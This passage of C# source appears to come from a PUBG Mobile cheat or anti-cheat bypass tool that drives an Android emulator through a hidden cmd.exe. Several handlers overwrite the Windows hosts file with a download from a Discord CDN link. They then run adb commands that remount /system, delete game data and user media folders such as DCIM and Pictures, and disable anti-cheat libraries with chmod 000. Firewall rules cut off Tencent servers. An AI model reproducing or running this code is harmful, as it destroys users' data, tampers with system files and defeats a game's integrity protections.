                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserEngine.ini /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserGame.ini /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserLogSuppression.ini /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 5");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/stdin");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.tencent.ig-1/libUE4.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/Android/data/com.tencent.tinput");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /init.vbox86.rc /init.vbox86.rc1");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /system/build.prop /system/build.prop1");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Superuser.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Settings.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SystemUI.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/app/tinput.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/bin/androVM_setprop");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /init.superuser.rc");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/lib/libbcinfo.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 444 /system/lib/hw/gralloc.vbox86.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /ueventd.vbox86.rc");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/lib/libhardware.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /default.prop");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /fstab.vbox86");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Settings/Settings.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SettingsProvider/SettingsProvider.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/InputDevices/InputDevices.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SystemUI/SystemUI.apk");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/xbin/su");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /ueventd.titan.rc");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /fstab.titan");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /.libcache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 7");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.tencent.ig-1/libtersafe.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.tencent.ig-1/libgcloud.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.tencent.ig-1/libTDataMaster.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Notifications");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.tencent.ig/app_bugly");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.tencent.ig/app_bugly");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 644 /data/data/com.tencent.ig/files");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.tencent.ig/files/iMSDK");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.tencent.ig/cache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 644 /data/data/com.tencent.ig/files/tss_tmp");
                    standardInput.WriteLine("netsh advfirewall firewall add rule name=update1 interface=any dir=out action=block remoteip=203.205.0.0-203.205.255.255,123.151.0.0-123.151.255.255,58.250.0.0-58.250.255.255,113.105.0.0-113.105.255.255");
                    standardInput.WriteLine("netsh advfirewall firewall add rule name=private protocol=TCP dir=out action=block enable=yes remoteport=15692,20371,23946,27042,27043,5403,5646,7312,7311,2384,2383,3013,18081,8085,8086,13003,10012,8081,8088,13004,5006,5012,5046,5045,8080,11042,11041,2979,2986,17000,13004,13003,35000,10013,10012,15692,20371");
                    standardInput.Flush();
                    standardInput.Close();
                    process.WaitForExit();
                    checkBox8.Checked = true;
                }
            }
            else
            { MainForm.cmd("taskkill /F /IM adb.exe"); }


        }

        private void checkBox10_CheckedChanged(object sender, EventArgs e)
        {
            using (WebClient webClient = new WebClient())
            {
                // webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.checkBox9_CheckedChanged);
                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/780455747036905473/780455787616534628/hosts"), "C:\\Windows\\System32\\drivers\\etc\\hosts");
            }
            try
            {
                File.WriteAllText(Environment.SystemDirectory + "\\..\\UserEngine.ini", JOY.Properties.Resources.UserEngine);
            }
            catch { }
            try
            {
                File.WriteAllText(Environment.SystemDirectory + "\\..\\UserGame.ini", JOY.Properties.Resources.UserGame);
            }
            catch { }
            try
            {
                File.WriteAllText(Environment.SystemDirectory + "\\..\\UserLogSuppression.ini", JOY.Properties.Resources.UserLogSuppression);
            }
            catch { }
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("adb.exe kill-server");
                standardInput.WriteLine("adb.exe start-server");
                standardInput.WriteLine("adb connect 127.0.0.1:5555");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mount -o rw,remount");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mount -o rw,remount /system");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/app_crashrecord");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/code_cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/no_backup");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/app_crashrecord");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/code_cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/no_backup");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 500 /proc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.vng.pubgmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Logs");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/PufferTmpDir");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/backups");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/.backups");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/data");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/flywheel");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/MidasOversea");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/DCIM");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Download");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Alarms");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/mfcache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Notifications");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Movies");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Pictures");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Podcasts");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/QTAudioEngine");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Ringtones");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/test_sdcard.txt");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/app_webview");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/files/iMSDKD");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -r /data/user/0/com.vng.pubgmobile/files/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/files/tss_tmp/*");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/files/iMSDK/*");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell touch /data/data/com.vng.pubgmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -r /data/user/0/com.vng.pubgmobile/lib/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell touch /data/data/com.vng.pubgmobile/app_crashrecord");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.vng.pubgmobile/cache/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/cache/* ");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/app_bugly/*");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/bin/houdini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/bin/disable_houdini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/libs/libutils.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.vng.pubgmobile/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 444 /data/data/com.vng.pubgmobile/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.vng.pubgmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell cp /stdin /data/data/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rename /data/data/stdin /data/data/com.tencent.tinput");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am start -n com.vng.pubgmobile/com.epicgames.ue4.SplashActivity filter");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 2");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini /data/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini /data/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini /data/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserEngine.ini /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserGame.ini /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserLogSuppression.ini /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 5");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/stdin");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.vng.pubgmobile-1/libUE4.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/Android/data/com.tencent.tinput");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /init.vbox86.rc /init.vbox86.rc1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /system/build.prop /system/build.prop1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Superuser.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Settings.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SystemUI.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/app/tinput.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/bin/androVM_setprop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /init.superuser.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/lib/libbcinfo.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 444 /system/lib/hw/gralloc.vbox86.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /ueventd.vbox86.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/lib/libhardware.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /default.prop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /fstab.vbox86");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Settings/Settings.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SettingsProvider/SettingsProvider.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/InputDevices/InputDevices.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SystemUI/SystemUI.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/xbin/su");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /ueventd.titan.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /fstab.titan");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /.libcache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 7");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.vng.pubgmobile-1/libtersafe.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.vng.pubgmobile-1/libgcloud.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.vng.pubgmobile-1/libTDataMaster.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Notifications");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.vng.pubgmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.vng.pubgmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 644 /data/data/com.vng.pubgmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.vng.pubgmobile/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.vng.pubgmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 644 /data/data/com.vng.pubgmobile/files/tss_tmp");
                standardInput.WriteLine("netsh advfirewall firewall add rule name=update1 interface=any dir=out action=block remoteip=203.205.0.0-203.205.255.255,123.151.0.0-123.151.255.255,58.250.0.0-58.250.255.255,113.105.0.0-113.105.255.255");
                standardInput.WriteLine("netsh advfirewall firewall add rule name=private protocol=TCP dir=out action=block enable=yes remoteport=15692,20371,23946,27042,27043,5403,5646,7312,7311,2384,2383,3013,18081,8085,8086,13003,10012,8081,8088,13004,5006,5012,5046,5045,8080,11042,11041,2979,2986,17000,13004,13003,35000,10013,10012,15692,20371");
                standardInput.Flush();
                standardInput.Close();
                process.WaitForExit();
                checkBox8.Checked = true;
                MainForm.cmd("taskkill /F /IM adb.exe");
            }
        }

        private void checkBox11_CheckedChanged(object sender, EventArgs e)
        {
            using (WebClient webClient = new WebClient())
            {
                // webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.checkBox9_CheckedChanged);
                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/780455747036905473/780455787616534628/hosts"), "C:\\Windows\\System32\\drivers\\etc\\hosts");
            }
            try
            {
                File.WriteAllText(Environment.SystemDirectory + "\\..\\UserEngine.ini", JOY.Properties.Resources.UserEngine);
            }
            catch { }
            try
            {
                File.WriteAllText(Environment.SystemDirectory + "\\..\\UserGame.ini", JOY.Properties.Resources.UserGame);
            }
            catch { }
            try
            {
                File.WriteAllText(Environment.SystemDirectory + "\\..\\UserLogSuppression.ini", JOY.Properties.Resources.UserLogSuppression);
            }
            catch { }
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("adb.exe kill-server");
                standardInput.WriteLine("adb.exe start-server");
                standardInput.WriteLine("adb connect 127.0.0.1:5555");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mount -o rw,remount");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mount -o rw,remount /system");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/app_crashrecord");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/code_cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/no_backup");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/app_crashrecord");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/code_cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/no_backup");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 500 /proc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.pubg.krmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Logs");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/PufferTmpDir");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/backups");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/.backups");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/data");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/flywheel");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/MidasOversea");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/DCIM");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Download");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Alarms");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/mfcache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Notifications");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Movies");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Pictures");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Podcasts");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/QTAudioEngine");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Ringtones");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/test_sdcard.txt");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/app_webview");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/files/iMSDKD");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -r /data/user/0/com.pubg.krmobile/files/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/files/tss_tmp/*");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/files/iMSDK/*");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell touch /data/data/com.pubg.krmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -r /data/user/0/com.pubg.krmobile/lib/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell touch /data/data/com.pubg.krmobile/app_crashrecord");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.pubg.krmobile/cache/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/cache/* ");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/app_bugly/*");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/bin/houdini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/bin/disable_houdini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/libs/libutils.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.pubg.krmobile/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 444 /data/data/com.pubg.krmobile/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.pubg.krmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell cp /stdin /data/data/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rename /data/data/stdin /data/data/com.tencent.tinput");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am start -n com.pubg.krmobile/com.epicgames.ue4.SplashActivity filter");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 2");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini /data/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini /data/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini /data/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
